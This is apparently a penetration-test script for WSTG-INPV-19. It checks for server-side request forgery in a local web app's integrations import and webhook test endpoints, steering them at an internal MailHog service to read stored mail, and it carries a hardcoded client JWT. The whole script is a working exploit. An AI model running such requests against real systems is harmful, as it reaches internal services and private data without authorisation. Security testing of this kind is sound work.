"""
WSTG-INPV-19: SSRF through the integrations import and webhook test features.
Expected: the server successfully reaches the internal MailHog service by Docker hostname.
"""
import requests

BASE = "http://localhost:3000"
CLIENT_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJpZCI6IjU2NjRiN2YxLWRjNTctNGFhYy1hM2YxLTJlYzU5ZDc5MTVmOSIsImVtYWlsIjoidGVz"
    "dGNsaWVudEBoaXJlZmxvdy5jb20iLCJyb2xlIjoiY2xpZW50Iiwid2FsbGV0QmFsYW5jZSI6IjEx"
    "MDAxMDEwMjE1Nzc3MyIsImlhdCI6MTc3NDk2MTAzNywiZXhwIjoxNzc1NTY1ODM3fQ."
    "3pECPDykXAOh8VbOb0q19EcgmwsQBYWnq28wfG8AZ0o"
)

headers = {"Authorization": f"Bearer {CLIENT_TOKEN}"}

imp = requests.get(f"{BASE}/api/integrations/import", headers=headers, params={
    "url": "http://mailhog:8025/api/v2/messages",
}, timeout=10)
test = requests.post(f"{BASE}/api/webhooks/test", headers=headers, json={
    "url": "http://mailhog:8025/api/v2/messages",
}, timeout=10)

print("Import:", imp.status_code, imp.text[:140])
print("Webhook test:", test.status_code, test.text[:140])
assert imp.status_code == 200
assert test.status_code == 200
print("\n[VULNERABLE] Server-side requests can reach internal services")
